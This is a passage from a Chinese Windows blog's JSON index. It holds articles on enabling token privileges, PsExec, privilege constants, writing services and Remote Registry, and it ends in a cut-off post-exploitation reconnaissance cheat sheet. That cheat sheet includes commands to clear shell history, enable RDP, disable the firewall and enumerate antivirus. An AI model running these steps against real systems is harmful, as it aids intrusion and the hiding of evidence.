&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"权限","slug":"权限","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90/"},{"name":"会话","slug":"会话","permalink":"http://example.com/tags/%E4%BC%9A%E8%AF%9D/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【Windows】提权","date":"2023-10-27T01:24:02.061Z","path":"A_OS/Windows/权限与会话/提权/","text":"概述：提权代码 提权123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172BOOL EnablePrivilege(LPCTSTR lpszPrivilegeName, BOOL bEnable)&#123; int nResult = FALSE; int nRetCode = FALSE; HANDLE hToken = NULL; TOKEN_PRIVILEGES tkp = &#123; 0 &#125;; do &#123; nRetCode = ::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken); if (!nRetCode) break; nRetCode = ::LookupPrivilegeValue(NULL, lpszPrivilegeName, &amp;tkp.Privileges[0].Luid); if (!nRetCode) break; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0; nRetCode = ::AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL); if (!nRetCode) break; nResult = TRUE; &#125; while (FALSE); if (hToken != NULL) &#123; CloseHandle(hToken); &#125; return nResult;&#125;HANDLE GetExplorerToken()&#123; EnablePrivilege(SE_DEBUG_NAME, TRUE); HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot == INVALID_HANDLE_VALUE) &#123; return NULL; &#125; HANDLE hExplorerToken = NULL; PROCESSENTRY32 pe = &#123; 0 &#125;; pe.dwSize = sizeof(pe); BOOL bMore = ::Process32First(hSnapshot, &amp;pe); while (bMore) &#123; if (_tcsicmp(&quot;explorer.exe&quot;, pe.szExeFile) == 0) &#123; HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID); if (hProcess == NULL) &#123; continue; &#125; if (OpenProcessToken(hProcess, TOKEN_QUERY, &amp;hExplorerToken)) &#123; CloseHandle(hProcess); break; &#125; CloseHandle(hProcess); &#125; bMore = ::Process32Next(hSnapshot, &amp;pe); &#125; CloseHandle(hSnapshot); return hExplorerToken;&#125; 使用1234567891011HANDLE hExplorerToken = GetExplorerToken();if (hExplorerToken == NULL) break;char szUserProfilePath[MAX_PATH] = &#123; 0 &#125;;DWORD cchSize = MAX_PATH;if (!GetUserProfileDirectoryA(hExplorerToken, szUserProfilePath, &amp;cchSize))&#123; CloseHandle(hExplorerToken); break;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【Windows】提权工具 psExec.exe","date":"2023-10-27T01:24:02.061Z","path":"A_OS/Windows/权限与会话/提权工具/","text":"概述：psexec 用法 使用方法： 1psexec -i -d -s cmd.exe # 就是提权运行cmd 参数 说明 -a 使用逗号分隔应用程序可以在上面运行的处理器，其中 1 是编号最低的 CPU。 例如，若要在 CPU 2 和 CPU 4 上运行应用程序，请输入：“-a 2,4” -c 将指定的可执行文件复制到远程系统以执行。 如果省略此选项，则应用程序必须位于远程系统上的系统路径中。 -d 不要等待进程终止（非交互式）。 -e 不要加载指定帐户的配置文件。 -f 复制指定的程序，即使文件已存在于远程系统上。 -i 运行程序，使其与远程系统上指定会话的桌面进行交互。 如果未指定会话，则进程在控制台会话中运行。 当尝试以交互方式运行控制台应用程序（使用重定向的标准 IO）时，需要此标志。 -h 如果目标系统为 Vista 或更高版本，则使用帐户的提升令牌（如果可用）运行进程。 -l 以受限用户身份运行进程（删除 Administrators 组，并仅允许分配给 Users 组的权限）。 在 Windows Vista 上，进程以低完整性运行。 -n 指定连接到远程计算机的超时时间（以秒为单位）。 -p 指定用户名的可选密码。 如果省略此内容，系统将提示你输入隐藏密码。 -r 指定要创建或与之交互的远程服务的名称。 -s 在系统帐户中运行远程进程。 -u 指定登录远程计算机的可选用户名。 -v 仅当指定文件的版本号较高或比远程系统上的版本号新时，才复制指定文件。 -w 设置进程的工作目录（相对于远程计算机）。 -x 在 Winlogon 安全桌面上显示 UI（仅限本地系统）。 -priority 指定 -low、-belownormal、-abovenormal、-high 或 -realtime，以便以不同的优先级运行进程。 使用 -background 在 Vista 上以低内存和 I&#x2F;O 优先级运行。 computer 指示 PsExec 在指定的远程计算机上运行应用程序。 如果省略计算机名称，PsExec 将在本地系统上运行应用程序，如果指定通配符 (\\*)，PsExec 将在当前域中的所有计算机上运行命令。 @file PsExec 将在文件中列出的每台计算机上执行命令。 cmd 要执行的应用程序的名称。 arguments 要传递的参数（请注意，文件路径必须是目标系统上的绝对路径）。 -accepteula 此标志禁止显示许可证对话框。 -nobanner 此标志会消除启动横幅和版权消息。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【Windows】权限(Privilege Constants)","date":"2023-10-27T01:24:02.060Z","path":"A_OS/Windows/权限与会话/Privilege constants/","text":"windows 提权时常用的 Constants 微软官方文档：Privilege Constants (Winnt.h) - Win32 apps | Microsoft Learn 0x01 介绍Constants Constant&#x2F;value Description SE_ASSIGNPRIMARYTOKEN_NAMETEXT(“SeAssignPrimaryTokenPrivilege”) Required to assign the primary token of a process. User Right: Replace a process-level token. SE_AUDIT_NAMETEXT(“SeAuditPrivilege”) Required to generate audit-log entries. Give this privilege to secure servers. User Right: Generate security audits. SE_BACKUP_NAMETEXT(“SeBackupPrivilege”) Required to perform backup operations. This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the file. Any access request other than read is still evaluated with the ACL. This privilege is required by the RegSaveKey and RegSaveKeyExfunctions. The following access rights are granted if this privilege is held: READ_CONTROLACCESS_SYSTEM_SECURITYFILE_GENERIC_READFILE_TRAVERSEUser Right: Back up files and directories. If the file is located on a removable drive and the “Audit Removable Storage” is enabled, the SE_SECURITY_NAME is required to have ACCESS_SYSTEM_SECURITY. SE_CHANGE_NOTIFY_NAMETEXT(“SeChangeNotifyPrivilege”) Required to receive notifications of changes to files or directories. This privilege also causes the system to skip all traversal access checks. It is enabled by default for all users. User Right: Bypass traverse checking. SE_CREATE_GLOBAL_NAMETEXT(“SeCreateGlobalPrivilege”) Required to create named file mapping objects in the global namespace during Terminal Services sessions. This privilege is enabled by default for administrators, services, and the local system account. User Right: Create global objects. SE_CREATE_PAGEFILE_NAMETEXT(“SeCreatePagefilePrivilege”) Required to create a paging file. User Right: Create a pagefile. SE_CREATE_PERMANENT_NAMETEXT(“SeCreatePermanentPrivilege”) Required to create a permanent object. User Right: Create permanent shared objects. SE_CREATE_SYMBOLIC_LINK_NAMETEXT(“SeCreateSymbolicLinkPrivilege”) Required to create a symbolic link. User Right: Create symbolic links. **SE_CREATE_TOKEN_NAME**TEXT(“SeCreateTokenPrivilege”) Required to create a primary token. User Right: Create a token object. You cannot add this privilege to a user account with the “Create a token object” policy. Additionally, you cannot add this privilege to an owned process using Windows APIs.Windows Server 2003 and Windows XP with SP1 and earlier: Windows APIs can add this privilege to an owned process. **SE_DEBUG_NAME**TEXT(“SeDebugPrivilege”) Required to debug and adjust the memory of a process owned by another account. User Right: Debug programs. **SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME**TEXT(“SeDelegateSessionUserImpersonatePrivilege”) Required to obtain an impersonation token for another user in the same session. User Right: Impersonate other users. SE_ENABLE_DELEGATION_NAMETEXT(“SeEnableDelegationPrivilege”) Required to mark user and computer accounts as trusted for delegation. User Right: Enable computer and user accounts to be trusted for delegation. SE_IMPERSONATE_NAMETEXT(“SeImpersonatePrivilege”) Required to impersonate. User Right: Impersonate a client after authentication. SE_INC_BASE_PRIORITY_NAMETEXT(“SeIncreaseBasePriorityPrivilege”) Required to increase the base priority of a process. User Right: Increase scheduling priority. SE_INCREASE_QUOTA_NAMETEXT(“SeIncreaseQuotaPrivilege”) Required to increase the quota assigned to a process. User Right: Adjust memory quotas for a process. **SE_INC_WORKING_SET_NAME**TEXT(“SeIncreaseWorkingSetPrivilege”) Required to allocate more memory for applications that run in the context of users. User Right: Increase a process working set. **SE_LOAD_DRIVER_NAME**TEXT(“SeLoadDriverPrivilege”) Required to load or unload a device driver. User Right: Load and unload device drivers. **SE_LOCK_MEMORY_NAME**TEXT(“SeLockMemoryPrivilege”) Required to lock physical pages in memory. User Right: Lock pages in memory. **SE_MACHINE_ACCOUNT_NAME**TEXT(“SeMachineAccountPrivilege”) Required to create a computer account. User Right: Add workstations to domain. SE_MANAGE_VOLUME_NAMETEXT(“SeManageVolumePrivilege”) Required to enable volume management privileges. User Right: Manage the files on a volume. SE_PROF_SINGLE_PROCESS_NAMETEXT(“SeProfileSingleProcessPrivilege”) Required to gather profiling information for a single process. User Right: Profile single process. SE_RELABEL_NAMETEXT(“SeRelabelPrivilege”) Required to modify the mandatory integrity level of an object. User Right: Modify an object label. **SE_REMOTE_SHUTDOWN_NAME**TEXT(“SeRemoteShutdownPrivilege”) Required to shut down a system using a network request. User Right: Force shutdown from a remote system. SE_RESTORE_NAMETEXT(“SeRestorePrivilege”) Required to perform restore operations. This privilege causes the system to grant all write access control to any file, regardless of the ACL specified for the file. Any access request other than write is still evaluated with the ACL. Additionally, this privilege enables you to set any valid user or group SID as the owner of a file. This privilege is required by the RegLoadKey function. The following access rights are granted if this privilege is held: WRITE_DACWRITE_OWNERACCESS_SYSTEM_SECURITYFILE_GENERIC_WRITEFILE_ADD_FILEFILE_ADD_SUBDIRECTORYDELETEUser Right: Restore files and directories. If the file is located on a removable drive and the “Audit Removable Storage” is enabled, the SE_SECURITY_NAME is required to have ACCESS_SYSTEM_SECURITY. SE_SECURITY_NAMETEXT(“SeSecurityPrivilege”) Required to perform a number of security-related functions, such as controlling and viewing audit messages. This privilege identifies its holder as a security operator. User Right: Manage auditing and security log. SE_SHUTDOWN_NAMETEXT(“SeShutdownPrivilege”) Required to shut down a local system. User Right: Shut down the system. SE_SYNC_AGENT_NAMETEXT(“SeSyncAgentPrivilege”) Required for a domain controller to use the Lightweight Directory Access Protocol directory synchronization services. This privilege enables the holder to read all objects and properties in the directory, regardless of the protection on the objects and properties. By default, it is assigned to the Administrator and LocalSystem accounts on domain controllers. User Right: Synchronize directory service data. SE_SYSTEM_ENVIRONMENT_NAMETEXT(“SeSystemEnvironmentPrivilege”) Required to modify the nonvolatile RAM of systems that use this type of memory to store configuration information. User Right: Modify firmware environment values. SE_SYSTEM_PROFILE_NAMETEXT(“SeSystemProfilePrivilege”) Required to gather profiling information for the entire system. User Right: Profile system performance. SE_SYSTEMTIME_NAMETEXT(“SeSystemtimePrivilege”) Required to modify the system time. User Right: Change the system time. SE_TAKE_OWNERSHIP_NAMETEXT(“SeTakeOwnershipPrivilege”) Required to take ownership of an object without being granted discretionary access. This privilege allows the owner value to be set only to those values that the holder may legitimately assign as the owner of an object. User Right: Take ownership of files or other objects. **SE_TCB_NAME**TEXT(“SeTcbPrivilege”) This privilege identifies its holder as part of the trusted computer base. Some trusted protected subsystems are granted this privilege. User Right: Act as part of the operating system. **SE_TIME_ZONE_NAME**TEXT(“SeTimeZonePrivilege”) Required to adjust the time zone associated with the computer’s internal clock. User Right: Change the time zone. SE_TRUSTED_CREDMAN_ACCESS_NAMETEXT(“SeTrustedCredManAccessPrivilege”) Required to access Credential Manager as a trusted caller. User Right: Access Credential Manager as a trusted caller. SE_UNDOCK_NAMETEXT(“SeUndockPrivilege”) Required to undock a laptop. User Right: Remove computer from docking station. **SE_UNSOLICITED_INPUT_NAME**TEXT(“SeUnsolicitedInputPrivilege”) Required to read unsolicited input from a terminal device. User Right: Not applicable. 0x02 用法value不同，对应的操作和权限也不同，本文列举了有关 Privilege Constants 的一些使用方式。 LookupPrivilegeValue查找权限 1234567891011BOOL EnablePrivilege()&#123; LUID PrivilegeRequired ; BOOL bRes = FALSE; bRes = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;PrivilegeRequired); // ... return bRes;&#125; 使用 AdjustTokenPrivileges 修改权限123456789101112131415161718192021222324252627inline BOOL CToolhelp::EnablePrivilege(PCTSTR szPrivilege, BOOL fEnable) &#123; // Enabling the debug privilege allows the application to see // information about service applications BOOL fOk = FALSE; // Assume function fails HANDLE hToken; // Try to open this process&#x27;s access token if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; // Attempt to modify the given privilege TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, szPrivilege, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); // Don&#x27;t forget to close the token handle CloseHandle(hToken); &#125; return(fOk);&#125;// usage","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【服务】windows服务程序崩溃后自动拉起","date":"2023-10-27T01:24:02.058Z","path":"A_OS/Windows/服务/关于windows服务/","text":"概述：windows服务程序崩溃后自动拉起 [toc] windows服务程序崩溃后自动拉起Windows 操作系统中的服务程序崩溃后自动重新启动是由操作系统的服务控制管理机制决定的。这个机制确保关键的系统服务能够持续运行，即使在发生错误或异常情况下也能够自动进行恢复。 下面是一些可能导致服务程序崩溃后自动重新启动的原因： 服务恢复选项设置：Windows 操作系统提供了服务恢复选项，允许你为每个服务定义特定的恢复行为。这包括启动服务、重新启动服务和采取其他操作，如运行脚本或发送警报。通过配置这些选项，你可以指定服务崩溃后的行为，以实现自动重新启动。 故障回收管理器：Windows 服务控制管理器（SCM）负责监控和管理运行在操作系统中的服务。SCM 包含一个故障回收管理器（Failure Recovery Manager），它会检测服务崩溃事件，并根据预定义的规则自动触发恢复操作。这些规则可以指定在发生故障时自动重新启动服务。 服务依赖关系：在 Windows 系统中，服务可以定义它们所依赖的其他服务。当一个服务崩溃后，如果它的依赖服务还正常运行，那么操作系统会自动重新启动崩溃的服务，以保持整个系统的稳定性和连续性。 需要注意的是，服务程序崩溃后自动拉起并不一定总是适用于所有服务。某些服务可能会配置成在崩溃后停留在错误状态，并等待手动干预或其他特定条件才会重新启动。 总之，Windows 操作系统通过服务控制管理机制来确保关键服务的连续运行，使其具备自动恢复能力。这种行为通过服务恢复选项、故障回收管理器和服务依赖关系等机制来实现。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windows服务","slug":"windows服务","permalink":"http://example.com/tags/windows%E6%9C%8D%E5%8A%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"服务","slug":"A-OS/Windows/服务","permalink":"http://example.com/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"【服务】修改windows服务的启动等待时间","date":"2023-10-27T01:24:02.055Z","path":"A_OS/Windows/服务/修改Windows服务的启动等待时间/","text":"概述：修改windows服务启动等待时间 当调试Windows服务的启动代码时，服务经常因为长时间没有响应而被Windows关闭。 为了防止这种情况，我们需要设置注册表项：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ServicesPipeTimeout。 Windows用这个值就是来决定Service启动超时的时间。 值类型为 dword 类型。 ps: 在Control下建立一个dword类型的字段，改名为：ServicesPipeTimeout，设置一个比较大的时间，90000 等。默认为30000。单位是毫秒。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"服务","slug":"服务","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1/"},{"name":"service","slug":"service","permalink":"http://example.com/tags/service/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"服务","slug":"A-OS/Windows/服务","permalink":"http://example.com/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"【服务】windows 创建服务","date":"2023-10-27T01:24:02.054Z","path":"A_OS/Windows/服务/Windows服务进程/","text":"概述：windows操作系统创建服务实例 说明调用的相关系统API： CreateService StartServiceCtrlDispatcher RegisterServiceCtrlHandlerEx 代码使用时进需要修改 MyServiceName 即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;strsafe.h&gt;#define MyServiceName TEXT(&quot;MyService&quot;)bool g_bPausedFlag = false;HANDLE g_hSvcStopEvent = NULL;SERVICE_STATUS g_MyServiceStatus;SERVICE_STATUS_HANDLE g_hMyServiceStatusHandle;void __stdcall MyServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);DWORD __stdcall MyServiceHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);DWORD MyServiceInitialization(DWORD dwArgc, LPTSTR *lpszArgv);DWORD MyServiceWorker(DWORD dwArgc, LPTSTR *lpszArgv);int _tmain(int argc, TCHAR* argv[])&#123; SERVICE_TABLE_ENTRY dispatchTable[] = &#123; &#123;MyServiceName, (LPSERVICE_MAIN_FUNCTION)MyServiceMain&#125;, &#123;NULL, NULL&#125; &#125;; if (!StartServiceCtrlDispatcher(dispatchTable)) &#123; // cleaning worker &#125; return 0;&#125;void __stdcall MyServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)&#123; g_hSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL); g_hMyServiceStatusHandle = RegisterServiceCtrlHandlerEx(MyServiceName, (LPHANDLER_FUNCTION_EX)MyServiceHandlerEx, NULL); if (g_hMyServiceStatusHandle == NULL) return; g_MyServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; g_MyServiceStatus.dwServiceSpecificExitCode = 0; ReportServiceStatus(SERVICE_START_PENDING, 0, 0); DWORD dwRet = MyServiceInitialization(dwArgc, lpszArgv); if (dwRet != NO_ERROR) ReportServiceStatus(SERVICE_STOPPED, dwRet, 0); ReportServiceStatus(SERVICE_RUNNING, 0, 0); MyServiceWorker(dwArgc, lpszArgv); while (true) &#123; WaitForSingleObject(g_hSvcStopEvent, INFINITE); ReportServiceStatus(SERVICE_STOPPED, 0, 0); return; &#125;&#125;DWORD __stdcall MyServiceHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)&#123; switch (dwControl) &#123; case SERVICE_CONTROL_SHUTDOWN: case SERVICE_CONTROL_STOP: ReportServiceStatus(SERVICE_STOP_PENDING, 0, 0); SetEvent(g_hSvcStopEvent); break; case SERVICE_CONTROL_PAUSE: ReportServiceStatus(SERVICE_PAUSE_PENDING, 0, 0); g_bPausedFlag = true; break; case SERVICE_CONTROL_CONTINUE: ReportServiceStatus(SERVICE_CONTINUE_PENDING, 0, 0); g_bPausedFlag = false; break; case SERVICE_CONTROL_INTERROGATE: break; default: break; &#125; return 0;&#125;// 执行一些初始化过程DWORD MyServiceInitialization(DWORD dwArgc, LPTSTR *lpszArgv)&#123; return NO_ERROR;&#125;// 服务工作执行函数DWORD MyServiceWorker(DWORD dwArgc, LPTSTR *lpszArgv)&#123; return 0;&#125;// 向服务控制管理器报告状态信息void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)&#123; static DWORD dwCheckPoint = 1; g_MyServiceStatus.dwCurrentState = dwCurrentState; g_MyServiceStatus.dwWin32ExitCode = dwWin32ExitCode; g_MyServiceStatus.dwWaitHint = dwWaitHint; if (dwCurrentState == SERVICE_START_PENDING) g_MyServiceStatus.dwControlsAccepted = 0; else g_MyServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE; if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED)) g_MyServiceStatus.dwCheckPoint = 0; else g_MyServiceStatus.dwCheckPoint = dwCheckPoint++; SetServiceStatus(g_hMyServiceStatusHandle, &amp;g_MyServiceStatus);&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"服务","slug":"A-OS/Windows/服务","permalink":"http://example.com/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"【服务】Retmote Registry 服务","date":"2023-10-27T01:24:02.046Z","path":"A_OS/Windows/服务/RemoteRegistry/","text":"Remote Registry是什么服务？ Remote Registry,翻译为”远程注册表”,如果远程的计算机连接到了你的计算机那么他可以通过字符界面或者其他方式远程修改注册表.这是一个相当严重的漏洞,可以为黑客入侵提供早期的方便(修改某些项目便于入侵,比如操作系统版本). [toc] 开启 Remote Regustiy 服务默认情况下，Windows 7 禁用远程注册表服务（可能是出于安全原因）。 方法1 ui打开windows服务，在服务中修改 Remote Registry 服务的启动类型为手动，然后启动 Remote Registry 服务。 方法2 命令行 要从命令行启用它，请键入以下内容： 1sc \\\\computername config remoteregistry start= auto 确保 &#x3D; 符号和 auto 之间有一个空格，如果您在本地计算机上执行此操作，您可以删除 \\computername 部分，您也可以将“remoteregistry”替换为另一个服务来启用或禁用它。 启用该服务后，您可以重新启动计算机，或者立即使用以下命令启动它： 1sc \\\\computername start remoteregistry 使用ps工具 1sc start remoteregistry start= auto 启动服务并将其设置为自动 不需要启动服务 Remote Registry服务可以关闭吗？因此关闭这个服务没有什么害处,而益处很多.强烈建议关闭,并且禁用.另外系统中没有其他服务是依赖或者跟此服务有关联的，所以禁用之后不会对其他服务产生影响。 Remote Registry服务关闭方法： 1、按住键盘的“Win+R”快捷组合键，打开“运行”对话命令窗口，输入“services.msc”命令，点击“确定”；，如图： 2、打开服务界面后找到“Remote Registry”选项，并左键双击打开其属性对话窗口； 3、在打开的“Remote Registry 的属性”对话窗口中，在启动类型选项中选择“禁用”选项，再点击“应用”–“停止”–“确定”按钮保存设置即可解决问题。 以上就是Remote Registry服务的详细介绍了，小编强烈建议关闭此服务，因为注册表是一台电脑的核心数据库，我们必须保证自己核心数据库的安全。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"registry","slug":"registry","permalink":"http://example.com/tags/registry/"},{"name":"注册表","slug":"注册表","permalink":"http://example.com/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"服务","slug":"A-OS/Windows/服务","permalink":"http://example.com/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"windows 工具集","date":"2023-10-27T01:24:02.035Z","path":"A_OS/Windows/工具/工具集/","text":"查看 OLE&#x2F;COM 对象OLE&#x2F;COM Object Viewer PEview.exe二进制查看 PE 文件 Viewdll.exe查看dll导出接口、引用函数 exeinfo.exe查看exe的详细信息","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"工具集","slug":"工具集","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E9%9B%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"工具","slug":"A-OS/Windows/工具","permalink":"http://example.com/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"【windows】 内网信息收集","date":"2023-10-27T01:24:02.033Z","path":"A_OS/Windows/工具/内网信息收集/","text":"0x00 分析入口机器在提权完成后，尽可能多的收集此机器上的各种信息。 当前机器的角色 当前机器所在网络的拓扑结构 当前机器的网络位置&#x2F;区域 0x01 收集基础信息 Mainip、进程、端口、服务、共享、软件、补丁、wifi、rdp、 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071------------------系统---------------------set # 查看环境变量 wmic bios # 查看bios信息 fsutil fsinfo drives # 查看盘符systeminfo # 系统版本systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;------------------ip与网段---------------------ping -a ip # ip反查主机名netstat -A ip # 同上ipconfig /all #查看ip详细信息,关注是否多网卡、IP、DNSipconfig /displaydns #查看DNS缓存route print #查看路由arp -a #查看arp缓存表net view #查询机器列表type C:\\Windows\\System32\\drivers\\etc\\hosts #查看hosts⽂件---------------端口--------------------netstat -ano #查看端⼝开放情况netstat -ano|findstr 80 #查看80端⼝对应的PID---------------服务--------------------wmic service list brief # 查看安装的所有服务信息net start # 已启动的服务---------------共享--------------------wmic share get name,path,status # 查看共享信息net use # 查看已建立的连接net share # 查看共享net session # 查看会话net view \\ip # 查询指定IP共享---------------开机自启动程序--------------------wmic startup get command,caption---------------安装的程序--------------------wmic product get name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;---------------计划任务--------------------schtasks /query /fo LIST /v &gt; ed1dassc.txt---------------补丁信息（提权）--------------------wmic qfe get Caption,Description,HotFixID,InstalledOnsysteminfo---------------进程列表（免杀）--------------------wmic process list brief #当前进程列表tasklist #当前进程列表tasklist /svc #查看进程、pid、服务taskkill /f /t /im xx.exe #杀死xx.exe进程taskkill /F -pid 520 #杀死pid为520的进程wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed---------------查询IE浏览器的代理信息--------------------reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;---------------cmd、powershell（v3以下）当前窗口的历史命令--------------------Get-History | Format-List -Property * # 查询 powershell 当前窗⼝历史操作记录Clear-History # 删除 powershell 当前窗⼝历史操作记录Clear-History -Id 3 # 删除 指定 ID 的历史操作记录doskey /h # 查看 cmd 的历史操作记录doskey /reinstall # 删除 cmd 的历史操作记录# powershell v3、v4 版本需要安装Get-PSReadlineOptionmsiexec /q /i PackageManagement_x64.msi# 查看 powershellv5 历史操作记录type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt---------------杂七杂八-------------------- 用户与组信息12345678910111213141516---------------账户和密码信息------------------whoami /all #查询当前⽤户权限等net user #只显示本机的⽤户，不显示域⽤户net user &lt;xx&gt; #查看⽤户xx的具体信息wmic useraccount get #查看本机用户 或 域内所有账户wmic useraccount get Caption,LocalAccount,Disabled #net localgroup #查看本地组net localgroup administrators #查看本地组administrators管理员组。除了显示本机中⽤户，还会显示域⽤户(前提是该域⽤户在本机的Administrators组内)query user 或 quser #查询当前在线⽤户qwinsta #查询当前在线⽤户qwinsta /SERVER:IP #查看远程登录情况query session #查询会话query termserver #查询远程桌⾯主机列表net accounts #查看本地密码策略 RDP服务开关1234567891011121314---------------远程桌面服务--------------------#查端口 0xd3d &gt; 3389REG query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber#是否开启了rdp服务：0x1关闭，0x0开启REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections#2003开启远程桌面wmic PATH win32_terminalservicesetting WHERE (_Class!=&quot;&quot;) CALL SetAllowTSConnections 1#2008、2012开启远程桌面wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 防火墙开关 &amp; 策略配置123456789101112131415161718---------------防火墙开关 &amp; 策略配置--------------------netsh firewall show config #查看防火墙配置#2003之前操作netsh firewall set opmode disable #关闭防火墙netsh 